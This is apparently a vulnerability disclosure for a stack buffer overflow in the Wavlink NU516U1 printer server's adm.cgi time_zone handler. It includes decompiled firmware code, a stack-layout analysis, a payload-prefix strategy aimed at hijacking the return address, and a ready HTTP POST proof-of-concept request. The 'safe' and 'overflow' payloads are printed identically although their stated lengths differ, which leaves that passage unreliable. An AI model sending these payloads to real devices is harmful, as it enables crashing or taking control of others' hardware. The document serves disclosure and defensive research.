

## **Stack-based Buffer Overflow in Wavlink NU516U1 (V251208) via "time_zone" parameter on adm.cgi interface of adm.cgi component**

------

### **Overview**

- **Vendor**: Wavlink
- **Product**: NU516U1
- **Version**: WAVLINK-NU516U1-A-WO-20251208-BYFM
- **Vulnerability Type**: Stack-based Buffer Overflow
- **Product Purpose**: USB Printer Server
- **Firmware Download**: https://docs.wavlink.xyz/Firmware/?category=USB+Printer+Server&model=all
- **Default Password**: `admin`

------

### **Vulnerability Information**

- **Vulnerable Function**: `sub_40785C` (Handles NTP and Timezone settings)
- **Vulnerability Point**: `strcpy(v31, v4);`
- **Trigger Parameter**: `time_zone` (corresponds to `v4`)
- **Prerequisite**: `dstEnabled` must be set to `"1"` to enter the vulnerable branch.

------

### **Vulnerability Description**

Under the MIPS 32-bit architecture, this function allocates a fixed-size buffer `v31` (16 bytes) on the stack. The program uses `sub_40B2F8` to extract the `time_zone` string directly from the user's POST request. Prior to executing the `strcpy` copy operation, the program performs no validation on the length of the user-supplied string. An attacker can send a string exceeding 15 bytes (leaving 1 byte for `\x00`) to break the boundaries of `v31`, sequentially overwriting adjacent local variables, saved register values, and finally the return address (`$ra`) on the stack. When the function attempts to return, the execution flow is hijacked to an address controlled by the attacker.

------

### **Memory Layout Restoration (Normal vs. Overflow)**

```
int __fastcall sub_40785C(int a1)
{
  int v2; // $v0
  int v3; // $v0
  const char *v4; // $s1
  int v5; // $v0
  const char *v6; // $s7
  int v7; // $v0
  int v8; // $v0
  const char *v9; // $fp
  const char *v10; // $s5
  int v11; // $s2
  int v12; // $s3
  const char *v13; // $s3
  int v14; // $s2
  const char *v15; // $s3
  const char *v16; // $s6
  int v17; // $s2
  int v18; // $s2
  int v19; // $s3
  int v20; // $s2
  int v21; // $s3
  int v22; // $s2
  int v23; // $s0
  int v24; // $s0
  int v25; // $a1
  int v26; // $a1
  int v27; // $a1
  int v28; // $a1
  int v30; // [sp+14h] [-44h]
  _DWORD v31[4]; // [sp+30h] [-28h] BYREF
  _DWORD v32[4]; // [sp+40h] [-18h] BYREF
  const char *v33; // [sp+50h] [-8h]

  v2 = sub_40B2F8("time_zone", a1, 1);
  v4 = (const char *)strdup(v2);
  v3 = sub_40B2F8("ntpServer", a1, 1);
  v6 = (const char *)strdup(v3);
  v5 = sub_40B2F8("NTPSync", a1, 1);
  v33 = (const char *)strdup(v5);
  v7 = sub_40B2F8("ntpEnabled", a1, 1);
  v9 = (const char *)strdup(v7);
  v8 = sub_40B2F8("dstEnabled", a1, 1);
  v10 = (const char *)strdup(v8);
  if ( !access("/tmp/web_log", 0) )
  {
    v11 = fopen("/dev/console", "w+");
    if ( v11 )
    {
      fprintf(
        v11,
        "%s:%s:%d:time zone:%s,ntp server:%s,ntp sync:%s,ntp enable:%s,dstEnabled:%s\n",
        "adm.c",
        "set_ntp",
        1468,
        v4,
        v6,
        v33,
        v9,
        v10);
      fclose(v11);
    }
  }
  if ( !strcmp(v10, "1") )
  {
    memset(v32, 0, sizeof(v32));
    memset(v31, 0, sizeof(v31));
    strcpy(v31, v4);
    if ( !access("/tmp/web_log", 0) )
    {
      v12 = fopen("/dev/console", "w+");
      if ( v12 )
      {
        fprintf(v12, "%s:%s:%d:buf1=%s\n\n", "adm.c", "set_ntp", 1476, (const char *)v31);
        fclose(v12);
      }
    }
    v13 = (const char *)strtok(v31, "C");
    if ( !access("/tmp/web_log", 0) )
    {
      v14 = fopen("/dev/console", "w+");
      if ( v14 )
      {
        fprintf(v14, "%s:%s:%d:b=%s\n\n", "adm.c", "set_ntp", 1478, v13);
        fclose(v14);
      }
    }
    v15 = (const char *)strtok(0, ":");
    v16 = (const char *)strtok(0, "");
    if ( !access("/tmp/web_log", 0) )
    {
      v17 = fopen("/dev/console", "w+");
      if ( v17 )
      {
        fprintf(v17, "%s:%s:%d:c=%s\n\n", "adm.c", "set_ntp", 1481, v15);
        fclose(v17);
      }
    }
    if ( !access("/tmp/web_log", 0) )
    {
      v18 = fopen("/dev/console", "w+");
      if ( v18 )
      {
        fprintf(v18, "%s:%s:%d:p=%s\n\n", "adm.c", "set_ntp", 1482, v16);
        fclose(v18);
      }
    }
    v19 = atoi(v15);
    if ( !access("/tmp/web_log", 0) )
    {
      v20 = fopen("/dev/console", "w+");
      if ( v20 )
      {
        fprintf(v20, "%s:%s:%d:a=%d\n\n", "adm.c", "set_ntp", 1484, v19);
        fclose(v20);
      }
    }
    v21 = v19 - 1;
    if ( !access("/tmp/web_log", 0) )
    {
      v22 = fopen("/dev/console", "w+");
      if ( v22 )
      {
        fprintf(v22, "%s:%s:%d:a2=%d\n\n", "adm.c", "set_ntp", 1486, v21);
        fclose(v22);
      }
    }
    if ( v21 < 0 )
      sprintf(v32, "UTC-%0*d:%s", 2, -v21, v16);
    else
      sprintf(v32, "UTC+%0*d:%s", 2, v21, v16);
    if ( !access("/tmp/web_log", 0) )
    {
      v23 = fopen("/dev/console", "w+");
      if ( v23 )
      {
        fprintf(v23, "%s:%s:%d:tttzzz=%s\n\n", "adm.c", "set_ntp", 1493, (const char *)v32);
        fclose(v23);
      }
    }
    wlink_uci_set_value("system", "@system[0]", "timezone", v32);
  }
  else
  {
    wlink_uci_set_value("system", "@system[0]", "timezone", v4);
    if ( !access("/tmp/web_log", 0) )
    {
      v24 = fopen("/dev/console", "w+");
      if ( v24 )
      {
        fprintf(v24, "%s:%s:%d:tttz=%s\n\n", "adm.c", "set_ntp", 1497, v4);
        fclose(v24);
      }
    }
  }
  wlink_uci_set_value("winstar", "web", "dstEnabled", v10);
  wlink_uci_set_value("system", "ntp", "enabled", "1");
  sub_40A764("/etc/init.d/sysntpd restart &", v25);
  sub_40A764("/etc/init.d/system restart &", v26);
  sub_40A764("killall schedule.sh", v27);
  sub_40A764("schedule.sh", v28);
  return sub_409CC4(4, v4, v6, v33, v9, v30);
}
```



Based on the definition order of variables in the code and the stack offsets (`v31` at `sp+0x30`, `v32` at `sp+0x40`), the memory layout is as follows:

#### **1. Normal Stack Layout (Low address to High address)**

| **Stack Offset** | **Variable / Content** | **Size** | **Description**                                              |
| ---------------- | ---------------------- | -------- | ------------------------------------------------------------ |
| `$sp + 0x30`     | `v31`                  | 16 bytes | Starting point of vulnerability; intended to store timezone string |
| `$sp + 0x40`     | `v32`                  | 16 bytes | Adjacent buffer; used to store formatted timezone            |
| `$sp + 0x50`     | `v33` (Pointer)        | 4 bytes  | Pointer to `NTPSync`                                         |
| ...              | Other local variables  | Various  | Temporary pointers/variables like `v13` to `v18`             |
| `$sp + Frame`    | Saved `$ra`            | 4 bytes  | Backup of the function return address register               |

#### **2. Overflow Path**

When you input `UTC+8C1:AAAAAAAAAAAAAAA` (22 bytes):

- The first 16 bytes fill `v31`.
- The subsequent 6 bytes begin to submerge `v32`.
- If the length continues to increase (e.g., reaching over 40 bytes), it will overwrite `v33` and subsequent critical pointers. Since the program calls `strtok` and `atoi` immediately after `strcpy` to reference these addresses, overwriting them with invalid values (such as `0x41414141`) will cause the program to crash before reaching the return instruction.

------

### **Prefix Construction Strategy (UTC+8C1:)**

This is the most ingenious part of exploiting this vulnerability. A simple long string causes the program to "commit suicide" early; a valid prefix must be constructed to "protect" the exploit flow.

#### **1. Bypassing `strtok` Chain Detection**

Immediately after copying the data, the program performs three `strtok` parses:

- **First**: `strtok(v31, "C")`. The payload must contain the character `C` to make `v13` non-null.
- **Second**: `strtok(0, ":")`. The payload must contain `:` after `C`, otherwise `v15` becomes `NULL`.
- **Core Crash Point**: Immediately following this, `v19 = atoi(v15)` is executed. If `v15` is a null pointer, the program crashes directly due to illegal memory access, resulting in a 500 error and preventing execution from reaching the final return statement.

#### **2. Payload Construction Template**

To achieve stable RCE or overflow verification, the payload should be segmented according to the following logic:

- **[Valid Prefix Segment]**: `UTC+8C1:`
  - `C` satisfies the first segment cut.
  - `1` serves as valid input for `atoi`, preventing numeric conversion errors.
  - `:` satisfies the second segment cut, ensuring `v15` is valid.
- **[Padding / Overflow Segment]**: Append a large number of `A`s after this.
  - This data will pass through `v32` and other local variable areas, reaching the `$ra` storage slot at the top of `$sp`.

**Summary**: The role of the prefix is to deceive the parsing logic, ensuring the program's execution flow can run smoothly to the end of the function, thereby triggering the jump to the overwritten `$ra`.

### Memory critical point verification

A valid cookie must be set to trigger.

```plain
POST /cgi-bin/adm.cgi HTTP/1.1
Host: usblogin.link
Content-Length: 72
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://usblogin.link
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://usblogin.link/html/firewall.shtml
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: session=1250960714
Connection: close

page=ntp&ntpEnabled=1&dstEnabled=1&time_zone=UTC+8C1:AAAAAAAAAAAAAAA
```

**Safety payload**: `time_zone=UTC+8C1:AAAAAAAAAAAAAAA` (total length 21 bytes), although it exceeds 16 bytes but is within the fault tolerance range of local variables, return **200 OK**.

<img width="1197" height="501" alt="image" src="https://github.com/user-attachments/assets/e9c19113-0976-4b69-8842-4bf942ed0a53" />


**Overflow payload**: `time_zone=UTC+8C1:AAAAAAAAAAAAAAA` (total length 22 bytes), destroys key pointers on the stack (such as `v15` or `v33`), causing the program to crash during `atoi` or `sprintf`, returning **500 Internal Server Error**.

<img width="1206" height="510" alt="image" src="https://github.com/user-attachments/assets/8120a329-cecc-4865-ad9a-9d49fda41532" />




